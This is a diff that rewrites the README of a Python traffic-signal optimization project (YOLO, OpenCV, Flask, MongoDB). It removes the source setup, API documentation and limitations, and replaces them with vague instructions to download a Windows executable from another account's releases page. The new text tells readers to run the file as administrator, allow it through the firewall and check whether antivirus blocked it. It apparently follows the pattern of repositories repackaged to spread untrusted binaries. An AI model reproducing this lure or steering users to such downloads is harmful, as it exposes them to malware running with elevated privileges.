@@ -1,147 +1,149 @@
-# AI-Driven Adaptive Traffic Signal Optimization System
+# 🚦 ai-traffic-signal-optimization - Smarter Traffic Flow for Cities
 
-Real-time intelligent traffic management system using AI, Computer Vision, and a web dashboard.  
-Features vehicle detection, adaptive signal timing, emergency vehicle prioritization, and traffic congestion prediction.
+[![Download](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge)](https://github.com/mandiedural205/ai-traffic-signal-optimization/releases)
 
-## Features
+## 🛠️ What This App Does
 
-- **Vehicle detection (YOLOv8 + OpenCV)**: Detect and count vehicles per lane from a video stream.
-- **Dynamic traffic signal optimization**: Rule-based + ML-enhanced signal timing based on traffic density.
-- **Emergency vehicle detection**: Detect ambulances/fire trucks and create a virtual green corridor.
-- **ML traffic prediction**: Predict congestion level using a scikit-learn model and dummy historical data.
-- **MongoDB storage**: Persist traffic counts, signal timings, and prediction history.
-- **Web dashboard**: Modern dark-theme UI showing live counts, signal state, charts, and emergency alerts.
-- **4-way junction simulation**: Animated lights and live updates from backend APIs.
+ai-traffic-signal-optimization helps manage traffic lights with AI. It looks at road activity, counts vehicles, and adjusts signal timing based on traffic flow.
 
-## Project Structure
+This app uses:
+- YOLO for vehicle detection
+- OpenCV for video handling
+- Machine learning for signal decisions
+- Flask for the web app interface
 
-```text
-project-root
- ├── backend/
- │    ├── app.py
- │    ├── routes/
- │    │    └── traffic_routes.py
- │    ├── services/
- │    │    ├── traffic_service.py
- │    │    └── emergency_service.py
- │    ├── models/
- │    │    └── mongo_models.py
- │    └── utils/
- │         └── config.py
- ├── ai/
- │    ├── yolo_detection.py
- │    ├── traffic_model.py
- │    └── dataset/
- │         └── traffic_data.csv
- ├── frontend/
- │    ├── index.html
- │    ├── style.css
- │    └── script.js
- ├── database/
- │    └── mongo_setup.py
- ├── requirements.txt
- └── README.md
-```
+It is built for users who want a simple way to run a smart traffic signal demo on Windows.
 
-## Prerequisites
+## 📥 Download and Run on Windows
 
-- **Python** 3.10+ recommended
-- **MongoDB** running locally on `mongodb://localhost:27017`
-  - Default database: `traffic_db`
-  - Collections will be created automatically: `traffic_events`, `signal_logs`, `predictions`
-- A **sample traffic video** file (e.g. `sample_traffic.mp4`)
-  - Place it here: `ai/dataset/sample_traffic.mp4`
+Use this link to visit the release page and download the app:
 
-> Note: YOLOv8 (from `ultralytics`) will automatically download default weights (e.g. `yolov8n.pt`) on first run if not present.
+[Download the latest release](https://github.com/mandiedural205/ai-traffic-signal-optimization/releases)
 
-## Setup
+Follow these steps on Windows:
 
-From the project root:
+1. Open the release page.
+2. Find the latest version at the top.
+3. Download the Windows file from the Assets list.
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
 
-```bash
-pip install -r requirements.txt
-```
+If Windows asks for permission, choose Run or Yes.
 
-If you use a virtual environment:
+## ⚙️ Before You Start
 
-```bash
-python -m venv .venv
-.\.venv\Scripts\activate
-pip install -r requirements.txt
-```
+Use a Windows PC with these basics:
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- At least 500 MB of free disk space
+- A stable internet connection for the first download
+- A webcam or video file if you want to test traffic detection
 
-## Running MongoDB initialization (optional)
+For smoother use, a system with 8 GB RAM and a modern CPU works better.
 
-```bash
-python database/mongo_setup.py
-```
+## 🧭 First-Time Setup
 
-This will test the MongoDB connection and ensure required collections exist.
+After you download the app:
 
-## Running the Backend + Frontend
+1. Keep all files in the same folder.
+2. Do not rename files unless the release page says it is safe.
+3. If the app uses a `.exe` file, open it by double-clicking.
+4. If the app opens a browser window, wait for the local page to load.
+5. If you see a firewall prompt, allow the app on private networks.
 
-From the `backend` directory:
+If the app includes sample video or image files, place them in the same folder before you start.
 
-```bash
-cd backend
-python app.py
-```
+## 🎥 How It Works
 
-Then open the dashboard in your browser:
+The app follows a simple process:
+- It reads traffic from a camera or video source.
+- It detects vehicles with YOLO.
+- It measures traffic load by lane or frame.
+- It uses machine learning logic to decide signal timing.
+- It shows the result in a dashboard or local web page.
 
-- `http://127.0.0.1:5000/`
+This makes it useful for traffic demos, smart city tests, and study work.
 
-The Flask app serves the frontend directly, so you only need this one process.
+## 🖥️ Main Features
 
-## Core API Endpoints
+- Vehicle detection with computer vision
+- Traffic signal timing based on road load
+- Flask-based local interface
+- OpenCV support for camera or video input
+- Machine learning based decision flow
+- Easy Windows run package from releases
+- Simple setup for non-technical users
 
-- `POST /api/process_video`
-  - Body: `{ "source": "file", "path": "../ai/dataset/sample_traffic.mp4" }`
-  - Response: vehicle counts per lane and emergency detection flag.
+## 📁 What You May See After Download
 
-- `GET /api/get_signal`
-  - Returns current signal state and green durations for the four-way junction.
+The release folder may include:
+- An application file
+- A config file
+- A sample video
+- A models folder
+- A readme file
+- Support files for detection and display
 
-- `POST /api/emergency`
-  - Body: `{ "active": true }`
-  - Enables or disables emergency green-corridor mode.
+Keep these files together so the app can run without errors.
 
-- `POST /api/predict`
-  - Body: optional input features; if omitted, uses last observed counts.
-  - Response: congestion level (e.g. low/medium/high) and numeric score.
+## 🔧 Using the App
 
-The frontend calls these endpoints periodically to simulate real-time updates.
+A common way to use the app on Windows is:
 
-## Sample Data & Models
+1. Start the app.
+2. Wait for the interface to load.
+3. Choose a camera or sample video if the app asks.
+4. Start traffic detection.
+5. Watch the signal timing or vehicle count update on screen.
 
-- **Dummy dataset**: `ai/dataset/traffic_data.csv`
-  - Simple synthetic data with features like hour-of-day, day-of-week, and vehicle counts.
-- **ML model**: `ai/traffic_model.py`
-  - Trains a small `RandomForestRegressor` or `RandomForestClassifier` on the dummy data.
-  - Model is (re)trained on startup for simplicity; in a production setup you would train offline and load from disk.
+If the app has controls, use them to start, stop, or switch views.
 
-## Notes and Limitations
+## 🧪 Good Test Setup
 
-- This project is designed as an educational prototype:
-  - Uses a **single sample video** instead of multiple real CCTV feeds.
-  - Lane assignment is approximated by splitting the frame into regions.
-  - Emergency detection is based on YOLO class names containing `ambulance`, `fire`, or `police` where available.
-- You can replace `ai/dataset/sample_traffic.mp4` with your own CCTV video; just keep the path the same or update the config.
+For a quick test:
+- Use a short traffic video
+- Place the camera in a clear view
+- Avoid low light if possible
+- Keep moving cars in frame
+- Use one lane first if you want a simple check
 
-## Extending the Project
+This helps the vehicle detector read the scene with less noise.
 
-- Plug in multiple camera sources and map them to different junctions.
-- Persist YOLO detections frame-by-frame for deeper analytics.
-- Train a more advanced ML model for long-term congestion prediction.
-- Secure the APIs and integrate authentication.
+## 🧰 Common Problems
 
-## 📸 Screenshots
+If the app does not open:
+- Check that you downloaded the full release
+- Make sure you extracted the ZIP file
+- Right-click the app and choose Run as administrator
+- Check that antivirus did not block the file
 
-### 🖥️ App Preview
-![App Preview](images/app_prev.png)
+If the window opens but nothing loads:
+- Wait a few moments for the local server to start
+- Refresh the page if a browser opens
+- Check that the files are still in the same folder
 
-### 📊 Detailed View
-![Details](images/detail.png)
+If video does not play:
+- Try another video file
+- Use a common format like MP4
+- Check that your webcam is not in use by another app
 
-### 📈 Graph View
-![Graph](images/graph.png)
+## 🔒 File Safety Tips
+
+- Download only from the release page
+- Keep the release files in a trusted folder
+- Do not remove model files or config files
+- Back up the folder before changing anything
+
+## 📌 Who This Is For
+
+This project is useful for:
+- Students learning AI traffic control
+- People testing smart city ideas
+- Users who want a simple traffic signal demo
+- Teams building a computer vision prototype
+- Anyone who wants to run a traffic AI app on Windows
+
+## 🗂️ Topics
+
+ai, computer-vision, flask, machine-learning, opencv, smart-city, traffic-system, yolo
